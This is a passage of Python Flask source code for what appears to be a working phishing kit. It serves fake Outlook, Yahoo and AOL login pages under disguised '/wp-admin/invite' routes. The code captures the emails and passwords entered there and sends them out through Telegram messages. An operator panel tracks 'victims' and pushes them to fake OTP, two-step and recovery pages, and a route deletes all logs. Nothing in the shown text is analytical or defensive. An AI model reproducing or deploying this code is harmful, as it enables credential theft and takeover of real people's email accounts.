        data = request.get_json()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            # Set admin session
            session['admin_logged_in'] = True
            session['admin_username'] = username
            
            # Log admin login
            client_ip = get_client_ip()
            print(f"🔑 Admin logged in from IP: {client_ip}")
            
            # Send Telegram notification for admin login
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"""
🔐 <b>ADMIN LOGIN DETECTED!</b>

👤 <b>Username:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Action:</b> Logged into Admin Panel

✅ <b>Admin authentication successful</b>
            """
            send_telegram_message(message)
            
            return jsonify({'success': True})
        else:
            # Log failed attempt
            client_ip = get_client_ip()
            print(f"🚫 Failed admin login attempt from IP: {client_ip}")
            
            # Send Telegram notification for failed attempt
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"""
🚫 <b>FAILED ADMIN LOGIN ATTEMPT!</b>

👤 <b>Username Attempted:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
❌ <b>Status:</b> Invalid credentials

⚠️ <b>Security alert - unauthorized access attempt</b>
            """
            send_telegram_message(message)
            
            return jsonify({'success': False, 'error': 'Invalid username or password'})
    
    # GET request - show login page
    return render_template('loginpanel.html')

@app.route('/admin-logout')
def admin_logout():
    """Admin logout"""
    if session.get('admin_logged_in'):
        username = session.get('admin_username', 'Unknown')
        client_ip = get_client_ip()
        
        # Send logout notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""
🔒 <b>ADMIN LOGGED OUT</b>

👤 <b>Username:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Action:</b> Logged out from Admin Panel

✅ <b>Admin session ended</b>
        """
        send_telegram_message(message)
    
    # Clear admin session
    session.pop('admin_logged_in', None)
    session.pop('admin_username', None)
    
    return redirect('/admin-login')

def admin_required(f):
    """Decorator to require admin authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            # Return JSON error for API routes
            if request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            # Redirect for HTML routes
            return redirect('/admin-login')
        return f(*args, **kwargs)
    return decorated_function

@app.route('/panel')
@admin_required
def panel():
    """Control panel - accessible directly from Telegram"""
    return render_template('panel.html')

@app.route('/api/get-victims')
@admin_required
def get_victims():
    """Get all active victims with current status - OPTIMIZED"""
    conn = get_db_connection()
    c = conn.cursor()
    
    # 🚨 OPTIMIZED QUERY - FIXED N+1 PROBLEM
    c.execute('''
        SELECT 
            v.session_id, 
            v.email, 
            v.ip_address, 
            v.current_page, 
            v.timestamp,
            (SELECT COUNT(*) FROM navigations n WHERE n.session_id = v.session_id) as nav_count,
            (SELECT MAX(timestamp) FROM navigations n WHERE n.session_id = v.session_id) as last_activity
        FROM victims v 
        WHERE v.is_active = TRUE
        ORDER BY v.timestamp DESC
        LIMIT 50  -- 🚨 ADD LIMIT FOR PERFORMANCE
    ''')
    victims = c.fetchall()
    
    conn.close()
    
    return jsonify({
        'victims': [{
            'session_id': v[0],
            'email': v[1] or 'No email yet',
            'ip_address': v[2],
            'current_page': v[3] or 'login',
            'timestamp': v[4],
            'nav_count': v[5] or 0,
            'last_activity': v[6]
        } for v in victims]
    })

@app.route('/api/victim-navigations/<session_id>')
@admin_required
def get_victim_navigations(session_id):
    """Get navigations for a specific victim"""
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute("SELECT * FROM navigations WHERE session_id = %s ORDER BY timestamp DESC LIMIT 20", (session_id,))
    navigations = c.fetchall()
    
    c.execute("SELECT * FROM victims WHERE session_id = %s", (session_id,))
    victim = c.fetchone()
    
    conn.close()
    
    return jsonify({
        'victim': {
            'id': victim[0],
            'email': victim[1],
            'ip_address': victim[2],
            'user_agent': victim[3],
            'session_id': victim[4],
            'current_page': victim[5],
            'is_active': victim[6],
            'timestamp': victim[7]
        } if victim else None,
        'navigations': [{
            'id': nav[0],
            'session_id': nav[1],
            'email': nav[2],
            'ip_address': nav[3],
            'page_url': nav[4],
            'timestamp': nav[5]
        } for nav in navigations]
    })

@app.route('/api/control-victim', methods=['POST'])
@admin_required
def control_victim():
    """Control victim navigation"""
    data = request.get_json()
    session_id = data.get('session_id')
    action = data.get('action')
    
    if session_id:
        # Map actions to page names
        action_to_page = {
            'go_to_waiting': 'waiting',
            'go_to_login': 'gmail_login',
            'go_to_stall': 'stall',
            'go_to_verify': 'verify',
            'go_to_password': 'password',
            'go_to_reset': 'reset',
            'go_to_otp': 'otp',
            'go_to_invalid': 'invalid',
            'go_to_recovery': 'recovery',
            'go_to_2step': 'twostep'
        }
        
        if action in action_to_page:
            page_name = action_to_page[action]
            
            # Store command
            victim_commands[session_id] = action
            update_victim_page(session_id, page_name)
            
            ip_address = active_victims.get(session_id, {}).get('ip_address', 'Unknown')
            send_telegram_message(f"🔄 <b>Command Sent:</b> Victim forced to {page_name.replace('_', ' ').title()} Page\n🌐 <b>IP:</b> <code>{ip_address}</code>")
    
    return jsonify({'success': True})

@app.route('/api/delete-victim', methods=['POST'])
@admin_required
def delete_victim():
    """Delete victim"""
    data = request.get_json()
    session_id = data.get('session_id')
    
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get victim info before deleting
    c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
    victim = c.fetchone()
    
    if victim:
        email, ip_address = victim
        
        # Deactivate victim
        c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
        
        # Send Telegram notification
        send_telegram_message(f"🗑️ <b>Victim Deleted:</b>\n📧 <b>Email:</b> <code>{email or 'No email'}</code>\n🌐 <b>IP:</b> <code>{ip_address}</code>")
    
    conn.commit()
    conn.close()
    
    # Remove from active victims and commands
    if session_id in active_victims:
        del active_victims[session_id]
    if session_id in victim_commands:
        del victim_commands[session_id]
    
    return jsonify({'success': True})
# ============ OUTLOOK (MICROSOFT) ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/hotmail/', methods=['GET', 'POST'])
def microsoft_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['user_email'] = email
        
        # Get victim session
        session_id = session.get('victim_session')
        if session_id:
            # Update victim with email in database
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            # Update active victims
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        # Send Telegram notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📧 <b>Outlook Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Outlook Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/password")
    
    return render_template('microsoft.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/password', methods=['GET', 'POST'])
def microsoft_password(invite_num):
    email = session.get('user_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        # Send Telegram notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>Outlook Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/403")
    
    return render_template('passwordmicrosoft.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/403')
def microsoft_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

# ============ YAHOO ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/yahoo/', methods=['GET', 'POST'])
def yahoo_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['yahoo_email'] = email
        
        # Get victim session
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        # Send Telegram notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📧 <b>Yahoo Email/Username Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Yahoo Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/password")
    
    return render_template('yahoo.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/password', methods=['GET', 'POST'])
def yahoo_password(invite_num):
    email = session.get('yahoo_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>Yahoo Password Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/403")
    
    return render_template('yahoopassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/403')
def yahoo_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

# ============ AOL ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/aol/', methods=['GET', 'POST'])
def aol_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['aol_email'] = email
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📧 <b>AOL Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> AOL Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/password")
    
    return render_template('aol.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/password', methods=['GET', 'POST'])
def aol_password(invite_num):
    email = session.get('aol_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>AOL Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/403")
    
    return render_template('aolpassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/403')
def aol_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

# ============ OTHER ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/other/', methods=['GET', 'POST'])
def other_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        password = request.form.get('password', 'Not provided')
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>Other Login Attempt!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/other/403")
    
    return render_template('other.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/other/403')
def other_403(invite_num):
    return render_template('403.html', invite_num=invite_num)
@app.route('/api/clear-all-logs', methods=['POST'])
@admin_required
def clear_all_logs():
    """Clear ALL victim data and logs"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        # Delete all data from tables
        c.execute("DELETE FROM navigations")
        c.execute("DELETE FROM victims")
        
        # Reset sequences (for PostgreSQL)
        c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
        c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1") 
        
        conn.commit()
        conn.close()
        
        # Clear in-memory data
        active_victims.clear()
        victim_commands.clear()
        verify_page_data.clear()
        recovery_page_data.clear()
        verification_page_data.clear()
        
        # Send Telegram notification
        send_telegram_message("🗑️ <b>ALL LOGS CLEARED!</b>\n\n📊 <b>All victim data has been wiped clean</b>\n🔄 <b>System reset to initial state</b>")
        
        return jsonify({'success': True, 'message': 'All logs cleared successfully'})
        
    except Exception as e:
        print(f"Error clearing logs: {e}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(
        host='0.0.0.0', 
        port=5000,
        debug=False
    )
